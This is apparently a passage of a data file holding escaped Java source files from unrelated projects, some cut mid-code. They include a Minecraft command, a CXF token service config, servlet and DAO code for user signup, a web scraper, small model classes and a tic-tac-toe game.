if (rowIndex.get() == 0)\n                        widthWeightSum += scaled.getX();\n                }\n                \n                if (scaled.getYStrategy() == CellResponsiveStrategy.ScalingStrategy.SET_SIZE) {\n                    remainingHeights.set(columnIndex.get(), remainingHeights.get(columnIndex.get()) - scaled.getY());\n                } else if (scaled.getYStrategy() == CellResponsiveStrategy.ScalingStrategy.WEIGHT) {\n                    heightWeightSum.set(columnIndex.get(), heightWeightSum.get(columnIndex.get()) + scaled.getY());\n                }\n            }\n            \n            nextCell(columnIndex, rowIndex, columnCount);\n        }\n    \n        //>APPLY SCALES\n        \n        List<Double> heightWeight = new ArrayList<>();\n        columnIndex.set(0);\n        for (int weightSum : heightWeightSum) {\n            heightWeight.add(remainingHeights.get(columnIndex.get()) / ((double) weightSum));\n            columnIndex.incrementAndGet();\n        }\n        Double widthWeight = remainingWidth / ((double) widthWeightSum);\n        \n        rowIndex.set(0);\n        columnIndex.set(0);\n        \n        for (Component component : layoutComponents) {\n            CellResponsiveStrategy responsiveStrategy = getCellResponsiveStrategy(rowIndex, columnIndex);\n            \n            //Skip to next cell if this is merged, since merged cells don't have a corresponding component\n            if (responsiveStrategy instanceof CellResponsiveStrategy.MergeAbove) {\n                nextCell(columnIndex, rowIndex, columnCount);\n                responsiveStrategy = getCellResponsiveStrategy(rowIndex, columnIndex);\n            }\n    \n            //Apply widths and heights\n            if (responsiveStrategy instanceof CellResponsiveStrategy.Scaled scaled) {\n                if (scaled.getXStrategy() ==",
    "/**\n * regex2smtlib: A regex to smtlib translator\n *\n * The MIT License (MIT)\n *\n * Copyright (c) 2017 Julian Thome <julian.thome.de@gmail.com>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy of\n * this software and associated documentation files (the \"Software\"), to deal in\n * the Software without restriction, including without limitation the rights to\n * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies\n * of the Software, and to permit persons to whom the Software is furnished to do\n * so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n **/\n\npackage com.github.hycos.regex2smtlib.translator;\n\nimport com.github.hycos.regex2smtlib.translator.exception.TranslationException;\n\npublic interface TranslatorIface {\n    /**\n     * translates regular expression string to SMT-LIB format\n     * @param regex regular expression string\n     * @return regular expression in SMT-LIB format\n     * @throws TranslationException somehting went wrong during the translation\n     */\n    String translate(String regex) throws TranslationException;\n\n    /**\n     * return a translation map, i.e., a mapping table that maps\n     * regular expression operations to native operations\n     * @return translation map\n     */\n    TranslationMap getTmap();\n\n    /**\n     * get the name of the translator\n     * @return String that uniquely identifies the translator\n     */\n    String getName();\n}\n",
    "package me.lachrymogenic.lachryvision.commands;\n\nimport me.lachrymogenic.lachryvision.Constants;\nimport net.minecraft.command.CommandBase;\nimport net.minecraft.command.ICommandSender;\nimport net.minecraft.entity.player.EntityPlayerMP;\nimport net.minecraft.server.MinecraftServer;\nimport net.minecraft.util.ChatComponentTranslation;\nimport net.minecraft.world.World;\nimport net.minecraft.world.WorldSettings;\n\npublic class CommandGamemode extends CommandBase {\n    WorldSettings.GameType gameType;\n    public CommandGamemode(WorldSettings.GameType gameType) {\n        this.gameType = gameType;\n    }\n    @Override\n    public String getCommandName() {\n\n        switch(gameType) {\n            case CREATIVE:\n                return \"gmc\";\n            case SURVIVAL:\n                return \"gms\";\n            case ADVENTURE:\n                return \"gma\";\n        };\n\n        return null;\n    }\n\n    public int getRequiredPermissionLevel()\n    {\n        return 2;\n    }\n\n    @Override\n    public String getCommandUsage(ICommandSender sender) {\n        return \"commands.\" + getCommandName() + \".usage\";\n    }\n\n    @Override\n    public void processCommand(ICommandSender sender, String[] args) {\n        EntityPlayerMP entityPlayerMP = args.length >= 1 ? getPlayer(sender, args[0]) : getCommandSenderAsPlayer(sender);\n        ChatComponentTranslation chatcomponenttranslation = new ChatComponentTranslation(\"gameMode.\" + gameType.getName(), new Object[0]);\n        entityPlayerMP.setGameType(gameType);\n        entityPlayerMP.fallDistance = 0.0F;\n        func_152374_a(sender, this, 1, \"commands.gamemode.success.self\", new Object[] {chatcomponenttranslation});\n    }\n}\n",
    "package org.example.double_it_sts;\n\nimport jakarta.xml.ws.Endpoint;\nimport lombok.SneakyThrows;\nimport org.apache.cxf.Bus;\nimport org.apache.cxf.jaxws.EndpointImpl;\nimport org.apache.cxf.sts.StaticSTSProperties;\nimport org.apache.cxf.sts.provider.DefaultSecurityTokenServiceProvider;\nimport org.apache.cxf.sts.service.StaticService;\nimport org.apache.cxf.ws.security.sts.provider.SecurityTokenServiceProvider;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.xml.namespace.QName;\nimport java.util.List;\n\nimport static org.apache.cxf.rt.security.SecurityConstants.*;\n\n/**\n * Configures the STS.\n */\n@Configuration\npublic class CxfStsConfiguration {\n    /**\n     * Creates the SAML token provider.\n     */\n    @SneakyThrows\n    @Bean\n    public SecurityTokenServiceProvider securityTokenServiceProvider() {\n        final var provider = new DefaultSecurityTokenServiceProvider();\n\n        final var stsProperties = new StaticSTSProperties();\n        stsProperties.setIssuer(\"http://localhost:8080/services/sts\");\n        stsProperties.setCallbackHandler(new CallbackHandler(\"sts-provider\"));\n        stsProperties.setEncryptionCryptoProperties(\"stsstore.properties\");\n        stsProperties.setEncryptionUsername(\"server\");\n        stsProperties.setSignatureCryptoProperties(\"stsstore.properties\");\n        stsProperties.setSignatureUsername(\"sts\");\n        provider.setStsProperties(stsProperties);\n\n        final var service = new StaticService();\n        service.setEndpoints(List.of(\"http://localhost:8080/services/double-it\"));\n        provider.setServices(List.of(service));\n        return provider;\n    }\n\n    /**\n     * Creates the endpoint for the STS.\n     */\n    @Bean\n    public Endpoint sts(Bus bus, SecurityTokenServiceProvider stsProvider) {\n        final var endpoint = new EndpointImpl(bus, stsProvider);\n        endpoint.setWsdlLocation(\"DoubleSTSService.wsdl\");\n        endpoint.setServiceName(QName.valueOf(\"{http://docs.oasis-open.org/ws-sx/ws-trust/200512/}SecurityTokenService\"));\n        endpoint.setEndpointName(QName.valueOf(\"{http://docs.oasis-open.org/ws-sx/ws-trust/200512/}STS_Port\"));\n        endpoint.setPublishedEndpointUrl(\"http://localhost:8080/services/sts\");\n\n        endpoint.getProperties().put(CALLBACK_HANDLER, new CallbackHandler(\"sts-service\"));\n        endpoint.getProperties().put(SIGNATURE_PROPERTIES, \"stsstore.properties\");\n        endpoint.getProperties().put(SIGNATURE_USERNAME, \"sts\");\n        endpoint.getProperties().put(ENCRYPT_PROPERTIES, \"stsstore.properties\");\n        endpoint.getProperties().put(ENCRYPT_USERNAME, \"user\"); // ???\n\n        endpoint.publish(\"/sts\");\n        return endpoint;\n    }\n}\n",
    "package Controller;\r\n\r\nimport java.io.IOException;\r\nimport java.sql.SQLException;\r\n\r\nimport javax.servlet.ServletException;\r\nimport javax.servlet.annotation.MultipartConfig;\r\nimport javax.servlet.annotation.WebServlet;\r\nimport javax.servlet.http.HttpServlet;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport javax.servlet.http.HttpServletResponse;\r\nimport javax.servlet.http.Part;\r\n\r\nimport DAO.Dao;\r\nimport DTO.User;\r\n\r\n@WebServlet(\"/signup\")\r\n@MultipartConfig(maxFileSize = 10*1024*1024)\r\npublic class SaveUser  extends HttpServlet{\r\n\r\n\t@Override\r\n\tprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\r\n\t\t\r\n\t\tint id = Integer.parseInt(req.getParameter(\"id\"));\r\n\t\tString name = req.getParameter(\"name\");\r\n\t\tString email = req.getParameter(\"email\");\r\n\t\tlong contact = Long.parseLong(req.getParameter(\"contact\"));\r\n\t\t\r\n\t\t\r\n\t\tPart imagepart = req.getPart(\"image\");\r\n\t\tbyte[] imagebytes = imagepart.getInputStream().readAllBytes();\r\n\t\tString password = req.getParameter(\"password\");\r\n\t\t\r\n\t\t\r\n\t\tUser user = new User(id, name, email, contact, password, imagebytes);\r\n\t\t\r\n\t\tDao dao = new Dao();\r\n\t\t\r\n\t\ttry {\r\n\t\t\tint res = dao.saveData(user);\r\n\t\t\t\r\n\t\t\tif(res>0) {\r\n\t\t\t\tresp.sendRedirect(\"UserLogin.jsp\");\r\n\t\t\t}else {\r\n\t\t\t\tresp.sendRedirect(\"UserSignup.jsp\");\r\n\t\t\t}\r\n\t\t} catch (ClassNotFoundException e) {\r\n\t\t\t// TODO Auto-generated catch block\r\n\t\t\te.printStackTrace();\r\n\t\t} catch (SQLException e) {\r\n\t\t\t// TODO Auto-generated catch block\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t}\r\n\r\n}\r\n",
    "package fr.tathan.mom.mechanics.effects;\n\nimport fr.tathan.mom.Utils;\nimport io.th0rgal.oraxen.api.OraxenItems;\nimport org.bukkit.entity.Entity;\nimport org.bukkit.entity.LivingEntity;\nimport org.bukkit.entity.Player;\nimport org.bukkit.event.EventHandler;\nimport org.bukkit.event.Listener;\nimport org.bukkit.event.entity.EntityDamageByEntityEvent;\nimport org.bukkit.inventory.ItemStack;\n\npublic class EffectsMechanicManager implements Listener {\n\n    private final EffectsMechanicFactory factory;\n\n    public EffectsMechanicManager(EffectsMechanicFactory factory) {\n        this.factory = factory;\n    }\n\n    @EventHandler\n    public void onPlayerUse(EntityDamageByEntityEvent event) {\n        Entity entity = event.getEntity();\n        Entity damager = event.getDamager();\n        if (!(damager instanceof Player)) return;\n        if (!(entity instanceof LivingEntity)) return;\n\n        Player player = (Player) damager;\n        LivingEntity livingEntity = (LivingEntity) entity;\n\n        ItemStack item = player.getInventory().getItemInMainHand();\n        String itemID = OraxenItems.getIdByItem(item);\n        System.out.println(itemID);\n        EffectsMechanic mechanic = (EffectsMechanic) factory.getMechanic(item);\n        if (factory.isNotImplementedIn(itemID)) return;\n        if (mechanic == null) return;\n        System.out.println(mechanic.getEffects());\n\n        mechanic.getEffects().forEach(effect -> {\n            livingEntity.addPotionEffect(Utils.getPotionEffect(effect));\n        });\n    }\n\n}\n",
    "package business.entity.living;\n\nimport business.entity.LivingPropertyBase;\n\nimport java.io.Serializable;\nimport java.time.LocalDate;\n\npublic class LivingPropertyForRent extends LivingPropertyBase implements Serializable {\n\n    private String rentType;\n    private int prepaidMonths;\n\n    public LivingPropertyForRent(float price, String address, Float square, int numberOfRooms, int floor, int totalFloors, LocalDate timeAdded, String furnishing, String metroStation, String rentType, int prepaidMonths) {\n        super(price, address, square, numberOfRooms, floor, totalFloors, timeAdded, furnishing, metroStation);\n        this.rentType = rentType;\n        this.prepaidMonths = prepaidMonths;\n    }\n\n    public String getRentType() {\n        return rentType;\n    }\n\n    public void setRentType(String rentType) {\n        this.rentType = rentType;\n    }\n\n    public int getPrepaidMonths() {\n        return prepaidMonths;\n    }\n\n    public void setPrepaidMonths(int prepaidMonths) {\n        this.prepaidMonths = prepaidMonths;\n    }\n\n    @Override\n    public String toString() {\n        return \"{\\\"\u0446\u0435\u043d\u0430\\\":\" + getPrice() + \", \\\"\u0430\u0434\u0440\u0435\u0441\\\":\\\"\" + getAddress() + \"\\\", \\\"\u043f\u043b\u043e\u0449\u0430\u0434\u044c\\\":\" + getSquare() + \", \\\"\u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043a\u043e\u043c\u043d\u0430\u0442\\\":\" + getNumberOfRooms() + \", \\\"\u044d\u0442\u0430\u0436\\\":\" + getFloor() + \", \\\"\u043e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u0442\u0430\u0436\u0435\u0439\\\":\" + getTotalFloors() + \", \\\"\u0432\u0440\u0435\u043c\u044f \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f\\\":\\\"\" + getTimeAdded() + \"\\\", \\\"\u043c\u0435\u0431\u0435\u043b\u044c\\\":\\\"\" + getFurnishing() + \"\\\", \\\"\u043c\u0435\u0442\u0440\u043e\\\":\\\"\" + getMetroStation() + \"\\\", \\\"\u0442\u0438\u043f \u0430\u0440\u0435\u043d\u0434\u044b\\\":\\\"\" + getRentType() + \"\\\", \\\"\u043f\u0440\u0435\u0434\u043e\u043f\u043b\u0430\u0447\u0435\u043d\u043d\u044b\u0435 \u043c\u0435\u0441\u044f\u0446\u044b\\\":\" + getPrepaidMonths() + \"}\";\n    }\n}\n",
    "import java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Scanner;\nimport java.io.FileWriter;\nimport java.io.BufferedWriter;\n\n\n\npublic class CountryInfoApp {\n\tprivate String writeFilePath;\n\tprivate CountryInfo[] countriesInfo = new CountryInfo [48];\n\t\n\t//constructor\n\tpublic CountryInfoApp(String writeFilePath)\n\t{\n\t\tthis.writeFilePath=writeFilePath;\n\t}\n\tpublic void run() {process(); write();}\n\t//processing the app - Nathan Tundrea\n\tprivate void process()\n\t{\n\t\ttry {\n\t\t\tURL address = new URL(\"https://operationworld.org/locations/europe/\");\n\t\t\tScanner scan = new Scanner(address.openStream());\n\t\t\twhile(scan.hasNextLine()) {\n\t\t\t\tString line = scan.nextLine();\n\t\t\t\tif(line.contains(\"list-group small list-group-flush\")) \n\t\t\t\t{\n\t\t\t\t\tline=scan.nextLine();\n\t\t\t\t\tline=line.substring(line.indexOf(\"href=\")+5);\n\t\t\t\t\tString[] firstSplit=line.split(\"href=\");\n\t\t\t\t\tint i=0;\n\t\t\t\t\tfor (String link : firstSplit)\n\t\t\t\t\t{\n\t\t\t\t\t\t//pt test\n\t\t\t\t\t\tSystem.out.println(\"https://operationworld.org\"+link.substring(1, link.indexOf('>')-1));\n\t\t\t\t\t\tcountriesInfo[i] = getInfo(\"https://operationworld.org\"+link.substring(1, link.indexOf('>')-1));\n\t\t\t\t\t\ti++;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcatch(IOException e){\n\t\t\tSystem.out.println(\"Link invalid\");\n\t\t}\n\t\t\n\t\t//for printing some results\n//\t\tSystem.out.println();\n//\t\tSystem.out.println(\"Results\");\n//\t\t\n//\t\tfor (CountryInfo obj : countriesInfo)\n//\t\t{\n//\t\t\tSystem.out.println(obj.Name+\", \"+obj.Population+\", \"+obj.EvangelicalPercent+\"%\");\n//\t\t}\n//\t\tSystem.out.println();\n\t}\n\t\n\t//extracting country's info from their link - Caleb Motiu\n\tprivate static CountryInfo getInfo(String link) {\n        String country = null;\n        long populationResult = 0;\n        double evangelicalResult = 0;\n\n        try {\n            URL address = new URL(link);\n            try (Scanner scan = new Scanner(address.openStream())) {\n                while (scan.hasNextLine()) \n                {\n                    String line = scan.nextLine();\n\n                    if (line.contains(\"<th scope=\\\"row\\\">Population:</th>\")) \n                    {\n                        String population = scan.nextLine();\n                        int startingIndex = population.indexOf(\"<td>\");\n                        int endingIndex = population.indexOf(\"</td>\");\n                        String stringResult = population.substring(startingIndex + 4, endingIndex);\n                        String newStringResult = stringResult.replace(\",\", \"\");\n                        populationResult = Long.parseLong(newStringResult);\n                    }\n\n                    if (line.contains(\"Pray for:\")) \n                    {\n                        int startingIndex = line.indexOf(\":\") + 2;\n                        int endingIndex = line.indexOf(\"                </h1>\");\n                        if (line.contains(\"Germany\"))\n                        {\n                        \tstartingIndex= line.indexOf(\"G\");\n                        \tendingIndex= line.indexOf(\"ny\")+2;\n                        }\n                        country = line.substring(startingIndex, endingIndex);\n                    }\n\n                    if (line.contains(\"<th scope=\\\"row\\\">% Evangelical:</th>\")) \n                    {\n                        String evangelical = scan.nextLine();\n                        int startingIndex = evangelical.indexOf(\"<td>\");\n                        int endingIndex = evangelical.indexOf(\"</td>\");\n                        String stringResult = evangelical.substring(startingIndex + 4, endingIndex - 2);\n                        String newStringResult = stringResult.replace(\",\", \"\");\n                        evangelicalResult = Double.parseDouble(newStringResult);\n                    }\n                }\n            }\n        } catch (MalformedURLException e) {\n            System.err.println(\"Malformed URL: \" + e.getMessage());\n            e.printStackTrace();\n        } catch (IOException e) {\n            System.err.println(\"Error accessing URL: \" + e.getMessage());\n            e.printStackTrace();\n        } catch (NumberFormatException e) {\n            System.err.println(\"Error parsing number: \" + e.getMessage());\n            e.printStackTrace();\n        }\n\n            return new CountryInfo(country, populationResult, evangelicalResult);\n        \n    }\n\t\n\t//writing the file - Nathan Tundrea\n\tprivate void write() {\n\t\t// Write the CSV file\n\t\ttry {\n\t        StringBuilder output=new StringBuilder(\"\");\n            \n\t        // Build the header\n\t        output.append(\"Country, Population, Evangelical Percent\\n\");\n\n            // Build the data\n            for (CountryInfo obj : countriesInfo) {\n            \toutput.append(obj.Name+\", \"+obj.Population+\", \"+obj.EvangelicalPercent+\"%\\n\"); \n            } \n            System.out.println(output);\n            \n            // Open the file for writing\n            FileWriter fileWriter = new FileWriter(writeFilePath);\n            BufferedWriter bufferedWriter = new BufferedWriter(fileW",
    "package com.phucx.model;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Users {\n    private String userID;\n    private String email;\n    private String username;\n    private String password;\n    \n    public Users() {\n    }\n\n\n    public Users(String userID, String email, String username, String password) {\n        this.userID = userID;\n        this.email = email;\n        this.username = username;\n        this.password = password;\n    }\n\n\n    private static List<Users> convertUser(ResultSet rs) throws SQLException{\n        List<Users> users = new ArrayList<>();\n        while (rs.next()) {\n            String fusername = rs.getString(\"username\");\n            String fuserID = rs.getString(\"userID\");\n            String fpassword = rs.getString(\"password\");\n            String femail = rs.getString(\"email\");\n\n            // Create a new Users object\n            Users user = new Users(fuserID, femail, fusername, fpassword);\n            users.add(user);\n        }\n        return users;\n    }\n\n    private static List<Roles> convertRoles(ResultSet rs) throws SQLException{\n        List<Roles> roles = new ArrayList<>();\n        while (rs.next()) {\n            Integer roleID = rs.getInt(\"roleID\");\n            String roleName = rs.getString(\"roleName\");\n            // Create a new Roles object\n            Roles role = new Roles(roleID, roleName); \n            roles.add(role);\n        }\n        return roles;\n    }\n\n    public Users saveUser(Connection c) throws SQLException{\n        PreparedStatement st = c.prepareStatement(\n            \"insert into Users(userID, username, password, email) values(?,?,?,?)\");\n        st.setString(1, this.userID);\n        st.setString(2, this.username);\n        st.setString(3, this.password);\n        st.setString(4, this.email);\n        int rs = st.executeUpdate();\n        if(rs>0) return this;\n        return null;\n    }\n\n    public boolean deleteUser(Connection c) throws SQLException{\n        PreparedStatement st = c.prepareStatement(\n            \"exec deleteUser ?\");\n        st.setString(1, this.userID);\n        return !st.execute();\n    }\n\n    public boolean updateEmailAttribute(String value, Connection c) throws SQLException{\n        PreparedStatement st = c.prepareStatement(\"update Users set email = ? where userID=?\");\n        st.setString(1, value);\n        st.setString(2, this.userID);\n        int rs = st.executeUpdate();\n        if(rs>0){\n            return true;\n        }\n        return false;\n    }\n\n    public boolean updatePassword(String value, Connection c) throws SQLException{\n        PreparedStatement st = c.prepareStatement(\"update Users set password = ? where userID=?\");\n        st.setString(1, value);\n        st.setString(2, this.userID);\n        int rs = st.executeUpdate();\n        if(rs>0){\n            return true;\n        }\n        return false;\n    }\n\n\n\n    public List<Roles> getRoles(Connection c) throws SQLException{\n        PreparedStatement st = c.prepareStatement(\n            \"select r.*\\n\"+\n            \"from Users u join (UserRole ur join Roles r on ur.roleID=r.roleID) on u.userID=ur.userID\\n\"+\n            \"where u.userID=?\");\n        st.setString(1, this.userID);\n        ResultSet rs = st.executeQuery();\n        List<Roles> roles = convertRoles(rs);\n        return roles;\n    }\n\n    public static List<Users> getListUsersLike(String opusername, Connection c) throws SQLException{\n        String search = \"%\"+opusername+\"%\";\n        PreparedStatement st = c.prepareStatement(\"select * from users where username like ? order by username\");\n        st.setString(1, search);\n        ResultSet rs = st.executeQuery();\n        List<Users> users = convertUser(rs);\n        return users;\n    }\n\n    public static List<Users> getListUsersAtrtLike(String attributeName, String attributeValue, Connection c) throws SQLException{\n        String search = \"%\"+attributeValue+\"%\";\n        PreparedStatement st = c.prepareStatement(\"select * from users where ? like ? order by username\");\n        st.setString(1, attributeName);\n        st.setString(2, search);\n        ResultSet rs = st.executeQuery();\n        List<Users> users = convertUser(rs);\n        return users;\n    }\n\n    public static Users getUserByUsername(String username, Connection c) throws SQLException{\n        PreparedStatement ps = c.prepareStatement(\"SELECT * FROM Users where username=?\");\n        ps.setString(1, username);\n        ResultSet rs = ps.executeQuery();\n\n        // ResultSetMetaData rsmd = rs.getMetaData();\n        // int columnCount = rsmd.getColumnCount();\n\n        List<Users> users = convertUser(rs);\n        if(users.size()>0) return users.get(0);\n        return null;\n    }\n\n    public static List<Users> getListUsers(int maxResults, int firstResult, Connection c) throws SQLException{\n        PreparedStatement st = c.prepareStatement(\"select * from user",
    "package saldo;\n\npublic class din {\n    private int numero;\n    private String nome;\n    private double saldo;\n    public din(int numero,String nome,double depositoInicial){\n        this.numero = numero;\n        this.nome=nome;\n        this.saldo=depositoInicial;\n    }\n\n    public int getNumero() {\n        return numero;\n    }\n\n    public void setNumero(int numero) {\n        this.numero = numero;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public void setNome(String nome) {\n        this.nome = nome;\n    }\n\n    public double getSaldo() {\n        return saldo;\n    }\n\n    public void setSaldo(double saldo) {\n        this.saldo = saldo;\n    }\n\n    public void deposito(double quantidade){\n        saldo +=quantidade;\n    }\n    public void taxa(double quantidade){\n        saldo -=quantidade;\n        saldo -=5.0;\n    }\n}\npackage saldo2;\n\nimport saldo.din;\n\nimport java.util.Scanner;\n\npublic class Din2 {\n    public static void main(String[] args) {\n        Scanner ler = new Scanner(System.in);\n        System.out.println(\"Digite seu nome:\");\n        String nome = ler.nextLine();\n        System.out.println(\"Digite seu numero da conta:\");\n        int numero = ler.nextInt();\n        ler.nextLine();\n\n        System.out.println(\"Deseja depositar (sim/n\u00e3o):\");\n        String opcao = ler.nextLine();\n\n        double depositoInicial = 0.0;\n        if (opcao.equals(\"sim\")) {\n            System.out.println(\"Digite o valor do dep\u00f3sito:\");\n            depositoInicial = ler.nextDouble();\n        }\n\n        din dinheiro = new din(numero, nome, depositoInicial);\n\n        System.out.println(dinheiro.getNome() + \",\" + dinheiro.getNumero() + \",\" + dinheiro.getSaldo());\n\n        System.out.println(\"Digite o valor do dep\u00f3sito:\");\n        double valorDeposito = ler.nextDouble();\n        dinheiro.deposito(valorDeposito);\n        System.out.println(dinheiro.getNome() + \",\" + dinheiro.getNumero() + \",\" + dinheiro.getSaldo());\n\n        System.out.println(\"Digite o valor do saque:\");\n        double valorSaque = ler.nextDouble();\n        dinheiro.taxa(valorSaque);\n        System.out.println(dinheiro.getNome() + \",\" + dinheiro.getNumero() + \",\" + dinheiro.getSaldo());\n    }\n}\n",
    "package br.com.controller.model;\n\nimport java.util.Objects;\n\npublic class Curriculo {\n    private String nome;\n    private String dataNascimento;\n    private String email;\n    private String telefone;\n    private String linkedin;\n    private String github;\n    private String instagram;\n    private String experiencia;\n    private String habilidades;\n    private String educacao;\n\n    public Curriculo(){\n\n    }\n\n    public Curriculo(String nome, String dataNascimento, String email, String telefone, String linkedin,\n                     String github,\n                     String instagram, String experiencia, String habilidades, String educacao) {\n        this.nome = nome;\n        this.dataNascimento = dataNascimento;\n        this.email = email;\n        this.telefone = telefone;\n        this.linkedin = linkedin;\n        this.github = github;\n        this.instagram = instagram;\n        this.experiencia = experiencia;\n        this.habilidades = habilidades;\n        this.educacao = educacao;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public void setNome(String nome) {\n        this.nome = nome;\n    }\n\n    public String getDataNascimento() {\n        return dataNascimento;\n    }\n\n    public void setDataNascimento(String dataNascimento) {\n        this.dataNascimento = dataNascimento;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public String getTelefone() {\n        return telefone;\n    }\n\n    public void setTelefone(String telefone) {\n        this.telefone = telefone;\n    }\n\n    public String getLinkedin() {\n        return linkedin;\n    }\n\n    public void setLinkedin(String linkedin) {\n        this.linkedin = linkedin;\n    }\n\n    public String getGithub() {\n        return github;\n    }\n\n    public void setGithub(String github) {\n        this.github = github;\n    }\n\n    public String getInstagram() {\n        return instagram;\n    }\n\n    public void setInstagram(String instagram) {\n        this.instagram = instagram;\n    }\n\n    public String getExperiencia() {\n        return experiencia;\n    }\n\n    public void setExperiencia(String experiencia) {\n        this.experiencia = experiencia;\n    }\n\n    public String getHabilidades() {\n        return habilidades;\n    }\n\n    public void setHabilidades(String habilidades) {\n        this.habilidades = habilidades;\n    }\n\n    public String getEducacao() {\n        return educacao;\n    }\n\n    public void setEducacao(String educacao) {\n        this.educacao = educacao;\n    }\n\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Curriculo curriculo = (Curriculo) o;\n        return Objects.equals(nome, curriculo.nome) && Objects.equals(dataNascimento, curriculo.dataNascimento) && Objects.equals(email, curriculo.email) && Objects.equals(telefone, curriculo.telefone) && Objects.equals(linkedin, curriculo.linkedin) && Objects.equals(github, curriculo.github) && Objects.equals(instagram, curriculo.instagram) && Objects.equals(experiencia, curriculo.experiencia) && Objects.equals(habilidades, curriculo.habilidades) && Objects.equals(educacao, curriculo.educacao);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(nome, dataNascimento, email, telefone, linkedin, github, instagram, experiencia, habilidades, educacao);\n    }\n\n    @Override\n    public String toString() {\n        return \"Curriculo{\" +\n                \"nome='\" + nome + '\\'' +\n                \", dataNascimento='\" + dataNascimento + '\\'' +\n                \", email='\" + email + '\\'' +\n                \", telefone='\" + telefone + '\\'' +\n                \", linkedin='\" + linkedin + '\\'' +\n                \", github='\" + github + '\\'' +\n                \", instagram='\" + instagram + '\\'' +\n                \", experiencia='\" + experiencia + '\\'' +\n                \", habilidades='\" + habilidades + '\\'' +\n                \", educacao='\" + educacao + '\\'' +\n                '}';\n    }\n}\n\n",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class App {\n    JFrame frame = new JFrame();\n    JLabel textLabel = new JLabel();\n    JPanel textPanel = new JPanel();\n    JPanel boardPanel = new JPanel();\n    JButton[][] board = new JButton[3][3];\n    String playerS = \"S\";\n    String playerO = \"O\";\n    String currentPlayer = playerS;\n    boolean gameOver = false;\n    int turns = 0;\n\n    App() {\n\n\n        frame.setVisible(true);\n        frame.setTitle(\"Tic-Tac-Toe\");\n        frame.setSize(600, 650);\n        frame.setLocationRelativeTo(null);\n        frame.setResizable(false);\n        frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);\n        frame.setLayout(new BorderLayout());\n\n        textLabel.setBackground(Color.darkGray);\n        textLabel.setForeground(Color.white);\n        textLabel.setFont(new Font(\"Arial\", Font.BOLD, 50));\n        textLabel.setHorizontalAlignment(JLabel.CENTER);\n        textLabel.setText(\"Tic-Tac-Toe\");\n        textLabel.setOpaque(true);\n\n        textPanel.setLayout(new BorderLayout());\n        textPanel.add(textLabel);\n        frame.add(textPanel, BorderLayout.NORTH);\n\n        boardPanel.setLayout(new GridLayout(3, 3));\n        boardPanel.setBackground(Color.darkGray);\n        frame.add(boardPanel);\n\n        for (int r = 0; r < 3; r++) {\n            for (int c = 0; c < 3; c++) {\n                JButton tile = new JButton();\n                board[r][c] = tile;\n                boardPanel.add(tile);\n\n                tile.setBackground(Color.darkGray);\n                tile.setForeground(Color.white);\n                tile.setFont(new Font(\"Arial\", Font.BOLD, 120));\n                tile.setFocusable(true);\n\n                tile.addActionListener(new ActionListener() {\n                    @Override\n                    public void actionPerformed(ActionEvent e) {\n                        if (gameOver) return;\n                        JButton tile = (JButton) e.getSource();\n                        if (tile.getText() == \"\") {\n                            tile.setText(currentPlayer);\n                            turns++;\n                            checkWinner();\n                            if (!gameOver) {\n                                currentPlayer = currentPlayer == playerS ? playerO : playerS;\n                                textLabel.setText(currentPlayer + \" 's turn\");\n                            }\n\n\n                        }\n\n\n                    }\n                });\n\n\n            }\n\n        }\n    }\n\n    void checkWinner() {\n        for (int r = 0; r < 3; r++) {\n            if (board[r][0].getText() == \"\") continue;\n\n            if (board[r][0].getText() == board[r][1].getText() &&\n                    board[r][1].getText() == board[r][2].getText()) {\n                for (int i = 0; i < 3; i++) {\n                    setWinner(board[r][i]);\n                }\n                gameOver = true;\n                return;\n            }\n        }\n\n        for (int c = 0; c < 3; c++) {\n            if (board[0][c].getText() == \"\") continue;\n\n            if (board[0][c].getText() == board[1][c].getText() &&\n                board[1][c].getText() == board[2][c].getText()) {\n                for (int i = 0; i < 3; i++) {\n                 setWinner(board[i][c]);\n                }\n                gameOver = true;\n                return;\n            }\n\n\n            if (board[0][0].getText() == board[1][1].getText() &&\n                board[1][1].getText() == board[2][2].getText() &&\n                board[0][0].getText() != \"\") {\n                for (int i = 0; i < 3; i++) {\n                    setWinner(board[i][i]);\n                }\n                gameOver = true;\n        